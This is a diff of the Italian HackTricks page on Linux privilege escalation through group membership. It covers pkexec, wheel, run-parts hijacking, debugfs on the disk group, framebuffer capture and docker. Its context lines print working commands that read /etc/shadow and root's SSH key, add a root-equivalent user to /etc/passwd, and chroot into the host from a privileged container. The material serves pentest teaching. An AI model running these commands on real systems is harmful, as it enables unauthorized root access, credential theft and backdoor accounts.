@@ -1,4 +1,4 @@
-# Gruppi Interessanti - Linux Privesc
+# Gruppi Interessanti - Privesc Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -31,7 +31,7 @@ Questo perché tipicamente questi sono i gruppi all'interno della **politica pol
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni linux i gruppi **sudo** e **admin** appaiono.
+Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni Linux i gruppi **sudo** e **admin** appaiono.
 
 Per **diventare root puoi eseguire**:
 ```bash
@@ -43,7 +43,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione a questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
+**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -54,7 +54,7 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-## Gruppo Wheel
+## Wheel Group
 
 **A volte**, **per impostazione predefinita** all'interno del **/etc/sudoers** file puoi trovare questa riga:
 ```
@@ -86,9 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
+Se riusciamo a compromettere alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
 
-Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
+Compromettere il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -141,14 +141,14 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Nota che utilizzando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
+Nota che usando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
 Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`) riceverai un errore di "**Permesso negato**".
 
-## Video Group
+## Gruppo Video
 
 Utilizzando il comando `w` puoi scoprire **chi è connesso al sistema** e mostrerà un output simile al seguente:
 ```bash
@@ -163,7 +163,7 @@ Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamen
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e selezionare come tipo di file **Dati immagine raw**:
+Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e scegliere come tipo di file **Dati immagine raw**:
 
 ![](<../../../images/image (463).png>)
 
@@ -193,7 +193,7 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
+Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), puoi sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
 
 {{#ref}}
 ../docker-security/
